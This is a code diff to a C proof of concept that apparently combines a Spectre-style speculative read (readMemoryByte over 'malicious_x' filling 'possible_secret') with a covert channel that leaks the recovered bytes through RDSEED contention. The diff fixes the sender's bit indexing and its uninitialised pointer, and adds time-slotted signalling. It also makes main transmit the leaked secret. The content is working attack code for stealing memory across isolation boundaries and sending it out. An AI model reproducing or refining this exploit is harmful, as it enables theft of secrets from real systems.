@@ -4,6 +4,7 @@
 #include <string.h>
 #include <immintrin.h> // for rdseed
 #include <unistd.h> // for usleep
+#include <time.h> // for timekeeping
 #ifdef _MSC_VER
 #include <intrin.h> /* for rdtscp and clflush */
 #pragma optimize("gt", on)
@@ -112,25 +113,36 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 void rng_send(char * msg) {
     // send the data contained in the array 'msg' through the rng conditioner
     int len = strnlen(msg, 255);
-    int i, j;
-    int x = 0x80;
+    int i, j, k, ret;
+    int x;
+    unsigned long long p;
+    struct timespec tp;
 
     for (i = 0; i < len; i++) {
+        x = 0x80;
         for (j = 0; j < 8; j++) {
             // do the rdseed or don't
-            if (((msg[i] & x) >> (7 - i)) == 1) {
-                unsigned long long * p;
-                int k, ret;
-                for (k = 0; k < 256; k++) {
-                    ret = _rdseed64_step(p);
+            while (0 < 1) {
+                clock_gettime(CLOCK_REALTIME, &tp);
+                if (tp.tv_sec % 2 == 0) {
+                    if (((msg[i] & x) >> (7 - j)) == 1) {
+                        printf("1");
+                        for (k = 0; k < 100000; k++) {
+                            ret = _rdseed64_step(&p);
+                        }
+                        sleep(1);
+                        break;
+                    }
+                    else {
+                        printf("0");
+                        sleep(1);
+                        break;
+                    }
                 }
-                usleep(10000);
-            }
-            else {
-                usleep(100000);
             }
             x /= 2;
         }
+        printf("\n");
     }
 }
 
@@ -156,7 +168,9 @@ int main(int argc, const char ** argv) {
         readMemoryByte(malicious_x++, value, score);
         possible_secret[39-len] = value[0];
     }
+
     printf("%s\n", possible_secret);
+    rng_send(possible_secret);
     return(0);
 }
 
